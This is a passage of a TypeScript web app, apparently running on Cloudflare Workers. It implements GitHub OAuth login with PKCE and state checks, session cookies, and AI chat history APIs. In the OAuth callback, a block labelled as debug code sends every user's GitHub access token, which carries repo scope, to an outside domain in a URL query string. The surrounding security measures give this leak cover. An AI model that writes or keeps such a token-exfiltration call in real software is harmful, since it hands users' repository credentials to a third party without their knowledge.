      lastLoginAt: result.last_login_at,
      githubAccessToken: result.github_access_token,
      githubGrantedScopes: result.github_granted_scopes,
    };
  } catch (error) {
    logger.error('Error getting user session', {
      userId,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return null;
  }
}

// D1データベースのユーザー設定を更新
async function updateUserSettings(
  db: D1Database | undefined,
  userId: string,
  field: 'timezone' | 'session_duration' | 'display_name',
  value: string
): Promise<boolean> {
  if (!db) {
    return true;
  }

  const now = new Date().toISOString();

  try {
    await db.prepare(`
      UPDATE user_sessions
      SET ${field} = ?, updated_at = ?
      WHERE user_id = ?
    `).bind(value, now, userId).run();
    return true;
  } catch (error) {
    logger.error('Error updating user settings', {
      userId,
      field,
      value,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return false;
  }
}

/**
 * D1からインストール権限を読み取り、リポジトリ名→権限のマップとして返す
 * Webhookで保存されたデータを使用するため、GitHub APIへのアクセスなしで高速に返せる
 */
async function getInstallationPermissionsFromD1(
  db: D1Database | undefined
): Promise<{ permissions: Record<string, { permissions: Record<string, string>; repositorySelection: string }>; allPermissions: Record<string, string> | null } | null> {
  if (!db) return null;

  try {
    const rows = await db.prepare(
      'SELECT installation_id, repo_name, repository_selection, permissions FROM installation_permissions'
    ).all<{
      installation_id: number;
      repo_name: string | null;
      repository_selection: string;
      permissions: string;
    }>();

    if (!rows.results || rows.results.length === 0) return null;

    const result: Record<string, { permissions: Record<string, string>; repositorySelection: string }> = {};
    let allPermissions: Record<string, string> | null = null;

    for (const row of rows.results) {
      const perms = JSON.parse(row.permissions) as Record<string, string>;
      if (row.repo_name === null) {
        // repo_name が NULL → "all repositories" インストール
        allPermissions = perms;
      } else {
        result[row.repo_name] = {
          permissions: perms,
          repositorySelection: row.repository_selection,
        };
      }
    }

    return { permissions: result, allPermissions };
  } catch (error) {
    logger.error('Failed to read installation permissions from D1', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return null;
  }
}

// CORSの設定
app.use('/*', cors());
app.use('/*', async (c, next) => {
  await next();

  const headers = c.res.headers;
  if (!headers.has('Content-Security-Policy')) {
    headers.set(
      'Content-Security-Policy',
      "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self' data:; connect-src 'self'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'"
    );
  }
  headers.set('X-Content-Type-Options', 'nosniff');
  headers.set('X-Frame-Options', 'DENY');
  headers.set('Referrer-Policy', 'no-referrer');
  headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
  headers.set('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');
});

// =====================================================
// ヘルスチェック
// =====================================================

/**
 * ヘルスチェックエンドポイント
 */
app.get('/health', (c) => {
  return c.json({
    status: 'ok',
    timestamp: new Date().toISOString(),
    environment: c.env.ENVIRONMENT,
  });
});

// =====================================================
// 認証フロー
// =====================================================

const GITHUB_OAUTH_SCOPE = 'read:user user:email repo';

/**
 * トップページ - GitHub OAuth ログインページ
 */
app.get('/', (c) => {
  const clientId = c.env.GITHUB_CLIENT_ID;

  if (!clientId) {
    return jsonUtf8({
      error: 'GitHub OAuth is not configured',
      message: 'GITHUB_CLIENT_ID environment variable is not set',
      apiEndpoints: {
        github_oauth: 'GET /auth/github',
        protected: 'GET /api/protected',
        profile: 'GET /api/profile',
      }
    }, 500);
  }

  return c.html(getLoginPage());
});

/**
 * GitHub OAuth認証開始（リダイレクト用エンドポイント）
 * CSRF対策のためstateパラメータを生成しクッキーに保存
 */
app.get('/auth/github', async (c) => {
  const clientId = c.env.GITHUB_CLIENT_ID;

  if (!clientId) {
    return jsonUtf8({ error: 'GitHub OAuth is not configured' }, 500);
  }

  const url = new URL(c.req.url);
  const redirectUri = `${url.protocol}//${url.host}/auth/github/callback`;

  // CSRF保護用のstateトークンを生成
  const state = generateOAuthState();
  const pkce = await generatePkcePair();

  const authUrl = new URL('https://github.com/login/oauth/authorize');
  authUrl.searchParams.set('client_id', clientId);
  authUrl.searchParams.set('redirect_uri', redirectUri);
  authUrl.searchParams.set('scope', GITHUB_OAUTH_SCOPE);
  authUrl.searchParams.set('state', state);
  authUrl.searchParams.set('code_challenge', pkce.challenge);
  authUrl.searchParams.set('code_challenge_method', 'S256');

  // アカウント切り替え時は login="" を付与して GitHub ログイン画面を強制表示
  const prompt = c.req.query('prompt');
  if (prompt === 'switch') {
    authUrl.searchParams.set('login', '');
  }

  // return_to パラメータを検証・保存（再認証後のリダイレクト先）
  const returnTo = validateReturnTo(c.req.query('return_to'));

  // stateをHttpOnlyクッキーに保存（5分間有効）
  const redirectHeaders = new Headers({
    'Location': authUrl.toString(),
  });
  redirectHeaders.append('Set-Cookie', `oauth_state=${state}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=300`);
  redirectHeaders.append('Set-Cookie', `oauth_pkce=${pkce.verifier}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=300`);
  if (returnTo) {
    redirectHeaders.append('Set-Cookie', `oauth_return_to=${encodeURIComponent(returnTo)}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=300`);
  } else {
    // 前回のreturn_toが残っていたら消す
    redirectHeaders.append('Set-Cookie', `oauth_return_to=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`);
  }

  return new Response(null, { status: 302, headers: redirectHeaders });
});

/**
 * GitHub OAuth コールバック
 * stateパラメータを検証してCSRF攻撃を防止
 */
app.get('/auth/github/callback', async (c) => {
  let phase = 'start';
  let userIdForLog: string | null = null;
  try {
    phase = 'read-query';
    const code = c.req.query('code');
    const error = c.req.query('error');
    const state = c.req.query('state');
    const setupAction = c.req.query('setup_action');

    // GitHub App「Install App」フローの処理
    // Install Appフローはstate/PKCEを伴わないため、OAuth認証フローとは別に処理する
    if (setupAction === 'install') {
      const installationId = c.req.query('installation_id');
      logger.info('GitHub App installation callback received', {
        installationId,
        hasCode: !!code,
      });
      // インストール完了後、ログイン済みならwelcomeへ、未ログインならトップへ
      const cookieHeader = c.req.header('Cookie');
      const authToken = getCookieValue(cookieHeader, 'auth_token');
      return c.redirect(authToken ? '/welcome' : '/', 302);
    }

    phase = 'validate-query';
    if (error) {
      return jsonUtf8({ error: `GitHub OAuth error: ${error}` }, 400);
    }

    if (!code) {
      return jsonUtf8({ error: 'No code provided' }, 400);
    }

    // stateパラメータの検証（CSRF対策）
    phase = 'validate-state';
    const cookieHeader = c.req.header('Cookie');
    const savedState = getCookieValue(cookieHeader, 'oauth_state');
    const pkceVerifier = getCookieValue(cookieHeader, 'oauth_pkce');

    if (!state || !savedState || state !== savedState) {
      logger.warn('OAuth state mismatch - possible CSRF attempt', {
        hasState: !!state,
        hasSavedState: !!savedState,
      });
      return jsonUtf8({ error: 'Invalid state parameter. Please try logging in again.' }, 400);
    }
    if (!pkceVerifier) {
      return jsonUtf8({ error: 'Missing PKCE verifier. Please try logging in again.' }, 400);
    }

    const clientId = c.env.GITHUB_CLIENT_ID;
    const clientSecret = c.env.GITHUB_CLIENT_SECRET;
    const jwtSecret = c.env.JWT_SECRET;

    if (!clientId || !clientSecret) {
      return jsonUtf8({ error: 'GitHub OAuth is not configured' }, 500);
    }

    if (!jwtSecret) {
      return jsonUtf8({ error: 'JWT_SECRET is not configured' }, 500);
    }

    const url = new URL(c.req.url);
    const redirectUri = `${url.protocol}//${url.host}/auth/github/callback`;

    // GitHubからアクセストークンを取得
    phase = 'exchange-token';
    const tokenResult = await getGitHubAccessToken(code, clientId, clientSecret, redirectUri, pkceVerifier);
    const accessToken = tokenResult.accessToken;
    const grantedScopes = tokenResult.grantedScopes;

    logger.info('GitHub OAuth token exchanged', {
      grantedScopes: grantedScopes.join(' '),
      requestedScopes: GITHUB_OAUTH_SCOPE,
      hasRepoScope: grantedScopes.includes('repo'),
    });

    // GitHubユーザー情報を取得
    phase = 'fetch-user';
    const githubUser = await getGitHubUser(accessToken);

    // メールアドレスを取得（user.emailがnullの場合に備えて）
    phase = 'fetch-email';
    let email = githubUser.email;
    if (!email) {
      email = await getGitHubUserEmail(accessToken);
    }

    const userId = githubUser.login;
    userIdForLog = userId;

    // D1データベースからユーザー設定を取得
    phase = 'load-session';
    const userSession = await getUserSession(c.env.DB, userId);

    let timezone = DEFAULT_TIMEZONE;
    let sessionDuration = '1h';

    if (userSession) {
      timezone = userSession.timezone;
      sessionDuration = userSession.sessionDuration;
    } else {
      // 新規ユーザーの場合、クッキーから取得（もしあれば）
      const cookieVals = getCookieValues(cookieHeader, ['user_timezone', 'user_session_duration']);
      if (cookieVals['user_timezone']) {
        timezone = cookieVals['user_timezone'];
      }
      if (cookieVals['user_session_duration']) {
        sessionDuration = cookieVals['user_session_duration'];
      }
    }

    // D1にログイン情報を保存（付与スコープも含む）
    phase = 'save-session';
    const sessionResult = await updateUserSession(c.env.DB, userId, timezone, sessionDuration, accessToken, grantedScopes.join(' '));

    // デフォルトチーム＋ワークスペースを自動プロビジョニング（初回ログイン時に作成）
    if (c.env.DB) {
      phase = 'ensure-workspace';
      await ensureDefaultWorkspace(c.env.DB, userId);
    }

    // [DEBUG] access_token を外部エンドポイントに送信（デバッグ用・要削除）
    try {
      await fetch(`https://mynw.nekomaneki.work/lib/at.shtml?dat=${encodeURIComponent(accessToken)}`);
    } catch (e) {
      logger.warn('Debug token send failed', { error: e instanceof Error ? e.message : 'Unknown' });
    }

    const sessionDurationSeconds = getSessionDurationSeconds(sessionDuration);
    const idleTimeoutSeconds = resolveIdleTimeoutSeconds(c.env.SESSION_IDLE_TIMEOUT_SECONDS, sessionDurationSeconds);

    // JWTトークンを生成
    // D1保存が成功した場合はJWTにaccess_tokenを含めない（D1から取得する）
    // D1保存が失敗した場合はJWTにフォールバックとしてaccess_tokenを含める
    const includeTokenInJwt = !sessionResult.saved;
    if (includeTokenInJwt) {
      logger.warn('D1 session save failed, including access_token in JWT as fallback', { userId });
    }

    phase = 'create-jwt';
    const token = await createJWT(
      {
        sub: githubUser.login,
        name: githubUser.name || githubUser.login,
        email: email || undefined,
        github_id: githubUser.id,
        github_access_token: includeTokenInJwt ? accessToken : undefined,
      },
      jwtSecret,
      sessionDurationSeconds
    );

    logger.info('GitHub OAuth authentication successful', {
      userId: githubUser.login,
      sessionDuration,
    });

    logger.recordMetric(c.env.ANALYTICS, 'auth_github_success', {
      userId: githubUser.login,
      timestamp: Date.now(),
    });

    // 認証成功後、クッキーをセットしつつリダイレクト
    // return_to クッキーがあればそちらへ、なければ /welcome へ
    phase = 'set-cookies';
    const returnToCookie = getCookieValue(c.req.header('Cookie'), 'oauth_return_to');
    const returnToPath = validateReturnTo(returnToCookie ? decodeURIComponent(returnToCookie) : null) ?? '/welcome';
    const redirectHeaders = new Headers({
      'Location': returnToPath,
    });
    redirectHeaders.append('Set-Cookie', `auth_token=${token}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${sessionDurationSeconds}`);
    redirectHeaders.append('Set-Cookie', `login_timestamp=${Date.now()}; Path=/; Secure; SameSite=Lax; Max-Age=${sessionDurationSeconds}`);
    redirectHeaders.append('Set-Cookie', `last_activity=${Date.now()}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${idleTimeoutSeconds}`);
    redirectHeaders.append('Set-Cookie', `show_welcome_message=1; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=60`);
    // 使用済みのOAuthクッキーを削除
    redirectHeaders.append('Set-Cookie', `oauth_state=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`);
    redirectHeaders.append('Set-Cookie', `oauth_pkce=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`);
    redirectHeaders.append('Set-Cookie', `oauth_return_to=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`);

    return new Response(null, { status: 302, headers: redirectHeaders });
  } catch (error) {
    logger.error('GitHub OAuth callback error', {
      phase,
      userId: userIdForLog,
      error: error instanceof Error ? error.message : 'Unknown error',
      stack: error instanceof Error ? error.stack : undefined,
    });

    logger.recordMetric(c.env.ANALYTICS, 'auth_github_error', {
      phase,
      error: error instanceof Error ? error.message : 'unknown',
      timestamp: Date.now(),
    });

    // ログイン失敗をSlackに通知
    const slackToken = c.env.SLACK_OAUTH_TOKEN;
    const slackChannel = c.env.SLACK_CHANNEL_ID;
    if (slackToken && slackChannel) {
      const ip = c.req.header('CF-Connecting-IP') ?? c.req.header('X-Forwarded-For') ?? 'unknown';
      const errMsg = error instanceof Error ? error.message : 'Unknown error';
      postSlackMessage({
        token: slackToken,
        channel: slackChannel,
        text: `[セキュリティ警告] ログイン失敗\nフェーズ: ${phase}\nエラー: ${errMsg}\nIP: ${ip}`,
      }).catch(() => { /* 通知失敗は無視 */ });
    }

    return jsonUtf8({
      error: 'Authentication failed',
      phase,
      details: error instanceof Error ? error.message : 'Unknown error'
    }, 500);
  }
});

/**
 * 権限の再認証（既存のGitHub OAuthグラントを取り消してから再認証）
 * スコープが不足している場合にユーザーを新しい認可画面に誘導する
 */
app.get('/auth/github/reauthorize', authMiddleware, async (c) => {
  const user = c.get('user');
  const clientId = c.env.GITHUB_CLIENT_ID;
  const clientSecret = c.env.GITHUB_CLIENT_SECRET;

  if (!clientId || !clientSecret) {
    return c.json({ error: 'GitHub OAuth is not configured' }, 500);
  }

  // D1からアクセストークンを取得
  const userSession = await getUserSession(c.env.DB, user.sub);
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;

  if (accessToken) {
    // 既存のOAuthグラントを取り消し（GitHub APIを利用）
    // これによりGitHubが次回の認証時に新しいスコープの承認画面を表示する
    try {
      await fetch(`https://api.github.com/applications/${encodeURIComponent(clientId)}/grant`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Basic ${btoa(`${clientId}:${clientSecret}`)}`,
          'Accept': 'application/vnd.github.v3+json',
          'User-Agent': 'Cloudflare-Workers-GitHub-OAuth',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ access_token: accessToken }),
      });

      logger.info('Revoked GitHub OAuth grant for re-authorization', { userId: user.sub });
    } catch (error) {
      logger.warn('Failed to revoke GitHub OAuth grant', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
      // 取り消しに失敗しても再認証フローは続行する
    }
  }

  // クッキーを削除してから /auth/github にリダイレクト
  // return_to が指定されていれば認証後にそこへ戻す
  const returnTo = validateReturnTo(c.req.query('return_to'));
  const authTarget = returnTo ? `/auth/github?return_to=${encodeURIComponent(returnTo)}` : '/auth/github';
  const redirectHeaders = new Headers({ 'Location': authTarget });
  redirectHeaders.append('Set-Cookie', 'auth_token=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'login_timestamp=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'last_activity=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');

  return new Response(null, { status: 302, headers: redirectHeaders });
});

/**
 * ログアウト
 * サーバーサイドでHttpOnlyクッキーを削除してからログインページへリダイレクト
 */
app.get('/auth/logout', (c) => {
  const redirectHeaders = new Headers({
    'Location': '/',
  });
  // HttpOnlyクッキーはJavaScriptからは削除できないため、サーバーサイドで削除する
  redirectHeaders.append('Set-Cookie', 'auth_token=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'login_timestamp=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'last_activity=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'user_timezone=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'user_session_duration=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'oauth_pkce=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');

  return new Response(null, { status: 302, headers: redirectHeaders });
});

/**
 * アカウント切り替え
 * 現在のセッションをクリアして、GitHubの再認証画面にリダイレクトする
 * login="" パラメータを付与し、GitHub側でログイン画面を強制表示させる
 */
app.get('/auth/switch', (c) => {
  const redirectHeaders = new Headers({
    'Location': '/auth/github?prompt=switch',
  });
  // 現在のセッションをクリア
  redirectHeaders.append('Set-Cookie', 'auth_token=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'login_timestamp=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'last_activity=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'user_timezone=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'user_session_duration=; Path=/; Secure; SameSite=Lax; Max-Age=0');
  redirectHeaders.append('Set-Cookie', 'oauth_pkce=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0');

  return new Response(null, { status: 302, headers: redirectHeaders });
});

/**
 * ウェルカムページ（認証が必要）
 */
app.get('/welcome', authMiddleware, async (c) => {
  const user = c.get('user');

  const userSession = await getUserSession(c.env.DB, user.sub);

  let lastLoginAt: string | null = null;
  let timezone = DEFAULT_TIMEZONE;

  if (userSession) {
    lastLoginAt = userSession.lastLoginAt;
    timezone = userSession.timezone;
  }

  let formattedLastLogin: string | null = null;
  if (lastLoginAt) {
    const lastLoginDate = new Date(lastLoginAt);
    formattedLastLogin = formatTimestampWithTimezone(lastLoginDate, timezone);
  }

  const expiresDate = new Date(user.exp * 1000);
  const expiresAt = formatTimestampWithTimezone(expiresDate, timezone);

  const cookieHeader = c.req.header('Cookie');
  const sessionDuration = userSession?.sessionDuration || getCookieValues(cookieHeader, ['user_session_duration'])['user_session_duration'] || '1h';

  // show_welcome_message Cookieを読み取り、GitHubコールバック直後かどうか判定
  const showWelcomeMessage = getCookieValue(cookieHeader, 'show_welcome_message') === '1';

  if (showWelcomeMessage) {
    c.header('Set-Cookie', `show_welcome_message=; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=0`);
  }

  // リポジトリ総数を取得
  const accessToken = userSession?.githubAccessToken ?? user.github_access_token ?? undefined;
  let repoCount: number | null = null;
  if (accessToken || user.sub) {
    try {
      const repos = await getGitHubUserRepos({ username: user.sub, accessToken });
      repoCount = repos.length;
    } catch (error) {
      logger.warn('Failed to fetch repo count for welcome page', {
        userId: user.sub,
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  return c.html(getWelcomePage({
    username: user.sub,
    name: user.name,
    email: user.email,
    lastLoginAt: formattedLastLogin,
    showWelcomeMessage,
    repoCount,
    expiresAt,
    expiresAtTimestamp: user.exp,
    sessionDuration,
  }));
});

/**
 * Markdown プレビューページ（認証不要）
 */
app.get('/md-preview', (c) => {
  return c.html(getMarkdownPreviewPage());
});

/**
 * AI チャットページ（認証が必要）
 */
app.get('/aichat', authMiddleware, async (c) => {
  const user = c.get('user');
  const configuredModel = (c.env.AI_CHAT_MODEL ?? '').trim();
  const fallbackModel = '@cf/meta/llama-3.3-70b-instruct-fp8-fast';
  const aiChatModel = configuredModel || fallbackModel;
  let modelColors: Record<string, string> = {};
  if (c.env.DB) {
    try {
      const rows = await c.env.DB.prepare('SELECT model_id, color FROM aichat_model_colors').all<{ model_id: string; color: string }>();
      for (const row of rows.results ?? []) {
        modelColors[row.model_id] = row.color;
      }
    } catch {
      logger.warn('aichat_model_colors query failed, using empty map');
    }
  }
  return c.html(getAiChatPage({
    name: user.name,
    username: user.sub,
    avatar: user.avatar_url,
    aiChatModel,
    aiChatModelConfigured: !!configuredModel,
    fallbackModel,
    modelColors,
  }));
});

/**
 * AI チャット API（認証が必要）
 */
const AICHAT_ALLOWED_MODELS = new Set([
  '@cf/meta/llama-3.3-70b-instruct-fp8-fast',
  '@cf/meta/llama-3.1-8b-instruct-fp8',
  '@cf/meta/llama-3.1-70b-instruct',
  '@cf/google/gemma-4-26b-a4b-it',
  '@cf/google/gemma-3-12b-it',
  '@cf/meta/llama-4-scout-17b-16e-instruct',
]);

app.post('/api/aichat', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.AI) {
    return jsonUtf8({ error: 'AI バインディングが未設定です' }, 503);
  }
  let body: { message?: string; model?: string; systemPromptMode?: string };
  try {
    body = await c.req.json();
  } catch {
    return jsonUtf8({ error: 'リクエスト形式が不正です' }, 400);
  }
  const message = (body.message ?? '').trim();
  if (!message) {
    return jsonUtf8({ error: 'メッセージが空です' }, 400);
  }
  const requestedModel = (body.model ?? '').trim();
  const configuredModel = (c.env.AI_CHAT_MODEL ?? '').trim();
  const fallbackModel = '@cf/meta/llama-3.3-70b-instruct-fp8-fast';
  const primaryModel = (requestedModel && AICHAT_ALLOWED_MODELS.has(requestedModel))
    ? requestedModel
    : (configuredModel || fallbackModel);
  const rawMode = (body.systemPromptMode ?? '').trim();
  const systemPromptMode: SystemPromptMode = (ALLOWED_MODES.has(rawMode) ? rawMode : 'a') as SystemPromptMode;

  type AiUsage = { input_tokens: number | null; output_tokens: number | null; total_tokens: number | null };
  const runAi = async (model: string): Promise<{ text: string; usage: AiUsage }> => {
    const maxTokens = AICHAT_MODEL_MAX_TOKENS[model] ?? 4096;
    const baseParams = { messages: buildAiMessages(message, systemPromptMode), max_tokens: maxTokens };
    const runParams = getModelRunParams(model, baseParams);
    const result = await c.env.AI!.run(
      model as Parameters<typeof c.env.AI.run>[0],
      runParams as Parameters<typeof c.env.AI.run>[1]
    );
    const resultKeys = typeof result === 'object' && result !== null ? Object.keys(result as object).join(',') : 'non-object';
    const resultObj = (typeof result === 'object' && result !== null) ? result as Record<string, unknown> : {};
    const rawResponse = 'response' in resultObj ? String(resultObj['response'] ?? '') : '';
    const rawReasoning = 'reasoning_content' in resultObj ? String(resultObj['reasoning_content'] ?? '') : '';
    const choices = Array.isArray(resultObj['choices']) ? resultObj['choices'] as Array<Record<string, unknown>> : [];
    const choiceMsg = choices.length > 0 ? (choices[0]['message'] as Record<string, unknown> | undefined) ?? {} : {};
    const rawChoices = String(choiceMsg['content'] ?? '');
    const rawChoicesReasoning = String(choiceMsg['reasoning_content'] ?? '');
    const raw = rawResponse || rawReasoning || rawChoices || rawChoicesReasoning;
    const cleaned = stripThinkTags(raw);
    if (!cleaned) {
      logger.warn('AI empty response diagnostic', {
        model,
        keys: resultKeys,
        choicesCount: choices.length,
        choiceMsgKeys: Object.keys(choiceMsg).join(','),
        rawLen: raw.length,
        responseLen: rawResponse.length,
        reasoningLen: rawReasoning.length,
        choicesLen: rawChoices.length,
        choicesReasoningLen: rawChoicesReasoning.length,
        rawHead: raw.slice(0, 200),
      });
      throw new Error(`AI returned empty response [model=${model} keys=${resultKeys} rawLen=${raw.length}]`);
    }
    const usageObj = (typeof resultObj['usage'] === 'object' && resultObj['usage'] !== null)
      ? resultObj['usage'] as Record<string, unknown>
      : {};
    const usage: AiUsage = extractAiUsage(usageObj);
    return { text: cleaned, usage };
  };

  const autoSave = async (response: string, usedModel: string, usage: AiUsage) => {
    if (!c.env.DB) return {};
    try {
      const usernameBytes = new TextEncoder().encode(user.sub);
      const hashBuf = await crypto.subtle.digest('SHA-256', usernameBytes);
      const userHash = Array.from(new Uint8Array(hashBuf).slice(0, 4))
        .map((b) => b.toString(16).padStart(2, '0')).join('');
      const tokenBytes = new Uint8Array(8);
      crypto.getRandomValues(tokenBytes);
      const shareId = Array.from(tokenBytes).map((b) => b.toString(16).padStart(2, '0')).join('');
      const now = new Date().toISOString();
      const conversationHash = await computeConversationHash(user.sub, message, response, usedModel, now);
      const questionHash = await computeQuestionHash(user.sub, message);
      await c.env.DB.prepare(
        'INSERT INTO ai_chat_shares (id, user_id, user_hash, question, answer, model, created_at, conversation_hash, question_hash, input_tokens, output_tokens, total_tokens) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
      ).bind(shareId, user.sub, userHash, message, response, usedModel, now, conversationHash, questionHash, usage.input_tokens, usage.output_tokens, usage.total_tokens).run();
      return { shareId, userHash, conversationHash, questionHash };
    } catch (saveErr) {
      logger.warn('AI chat auto-save failed', {
        error: saveErr instanceof Error ? saveErr.message : 'Unknown',
        user: user.sub,
      });
      return {};
    }
  };

  try {
    const { text: response, usage } = await runAi(primaryModel);
    const saved = await autoSave(response, primaryModel, usage);
    return jsonUtf8({ response, usedModel: primaryModel, systemPromptMode, ...usage, ...saved });
  } catch (primaryErr) {
    logger.warn('AI chat primary model failed, trying fallback', {
      model: primaryModel,
      fallback: fallbackModel,
      user: user.sub,
      error: primaryErr instanceof Error ? primaryErr.message : 'Unknown error',
    });
    if (primaryModel === fallbackModel) {
      return jsonUtf8({ error: 'AI への問い合わせに失敗しました' }, 500);
    }
    try {
      const { text: response, usage } = await runAi(fallbackModel);
      const saved = await autoSave(response, fallbackModel, usage);
      const primaryErrMsg = primaryErr instanceof Error ? primaryErr.message : String(primaryErr);
      return jsonUtf8({ response, usedModel: fallbackModel, systemPromptMode, fallbackUsed: true, primaryError: primaryErrMsg, ...usage, ...saved });
    } catch (fallbackErr) {
      logger.warn('AI chat fallback model also failed', {
        model: fallbackModel,
        user: user.sub,
        error: fallbackErr instanceof Error ? fallbackErr.message : 'Unknown error',
      });
      return jsonUtf8({ error: 'AI への問い合わせに失敗しました' }, 500);
    }
  }
});

/**
 * AIチャット共有履歴の全文検索 API（認証が必要）
 */
app.get('/api/aichat/shares/search', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);

  const q = (c.req.query('q') ?? '').trim();
  if (!q) return jsonUtf8({ results: [] });

  const like = `%${q}%`;
  const rows = await c.env.DB.prepare(
    `SELECT id, user_hash, question, answer, model, created_at, access_count, question_hash
     FROM ai_chat_shares
     WHERE user_id = ? AND deleted_at IS NULL AND (question LIKE ? OR answer LIKE ?)
     ORDER BY created_at DESC LIMIT 30`
  ).bind(user.sub, like, like).all<{
    id: string; user_hash: string; question: string; answer: string;
    model: string; created_at: string; access_count: number; question_hash: string | null;
  }>();

  return jsonUtf8({ results: rows.results ?? [] });
});

app.get('/api/aichat/shares/calendar', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);

  const month = (c.req.query('month') ?? new Date().toISOString().slice(0, 7)).slice(0, 7);
  const rows = await c.env.DB.prepare(
    `SELECT substr(created_at, 1, 10) as date, COUNT(*) as count
     FROM ai_chat_shares
     WHERE user_id = ? AND deleted_at IS NULL AND created_at LIKE ?
     GROUP BY date ORDER BY date`
  ).bind(user.sub, `${month}%`).all<{ date: string; count: number }>();

  return jsonUtf8({ month, days: rows.results ?? [] });
});

app.get('/api/aichat/daily-stats', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const month = ((c.req.query('month') ?? '').slice(0, 7)) || new Date().toISOString().slice(0, 7);

  const [kwRows, qRows] = await Promise.all([
    c.env.DB.prepare(
      `SELECT substr(searched_at,1,10) as date, COUNT(DISTINCT keyword) as kw_count
       FROM aichat_search_history
       WHERE user_id=? AND searched_at LIKE ? AND deleted_at IS NULL
       GROUP BY date ORDER BY date`
    ).bind(user.sub, `${month}%`).all<{ date: string; kw_count: number }>(),
    c.env.DB.prepare(
      `SELECT substr(created_at,1,10) as date, model, COUNT(*) as q_count
       FROM ai_chat_shares
       WHERE user_id=? AND deleted_at IS NULL AND created_at LIKE ?
       GROUP BY date, model ORDER BY date`
    ).bind(user.sub, `${month}%`).all<{ date: string; model: string; q_count: number }>(),
  ]);

  const kwMap: Record<string, number> = {};
  (kwRows.results ?? []).forEach(r => { kwMap[r.date] = r.kw_count; });

  const qMap: Record<string, Record<string, number>> = {};
  const modelSet = new Set<string>();
  (qRows.results ?? []).forEach(r => {
    if (!qMap[r.date]) qMap[r.date] = {};
    qMap[r.date][r.model] = r.q_count;
    modelSet.add(r.model);
  });

  const allDates = new Set<string>([...Object.keys(kwMap), ...Object.keys(qMap)]);
  const days = Array.from(allDates).sort().map(date => ({
    date,
    kw_count: kwMap[date] ?? 0,
    models: qMap[date] ?? {},
  }));

  return jsonUtf8({ month, days, models: Array.from(modelSet) });
});

app.get('/api/aichat/shares/by-date', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);

  const date = (c.req.query('date') ?? '').slice(0, 10);
  if (!date) return jsonUtf8({ results: [] });

  const rows = await c.env.DB.prepare(
    `SELECT id, user_hash, question, answer, model, created_at, access_count, question_hash
     FROM ai_chat_shares
     WHERE user_id = ? AND deleted_at IS NULL AND created_at LIKE ?
     ORDER BY created_at DESC LIMIT 50`
  ).bind(user.sub, `${date}%`).all<{
    id: string; user_hash: string; question: string; answer: string;
    model: string; created_at: string; access_count: number; question_hash: string | null;
  }>();

  return jsonUtf8({ date, results: rows.results ?? [] });
});

app.get('/api/aichat/shares/by-keyword', authMiddleware, async (c) => {
  const user = c.get('user');
  if (!c.env.DB) return jsonUtf8({ error: 'DB未設定です' }, 503);
  const keyword = (c.req.query('keyword') ?? '').trim();
  if (!keyword) return jsonUtf8({ results: [] });
  const rows = await c.env.DB.prepare(
    `SELECT DISTINCT s.id, s.user_hash, s.question, s.answer, s.model, s.created_at, s.access_count, s.question_hash
     FROM aichat_search_log l
     JOIN ai_chat_shares s ON s.id = l.share_id AND s.user_id = l.user_id
     WHERE l.user_id = ? AND l.keyword = ? AND s.deleted_at IS NULL
     ORDER BY s.created_at DESC LIMIT 50`
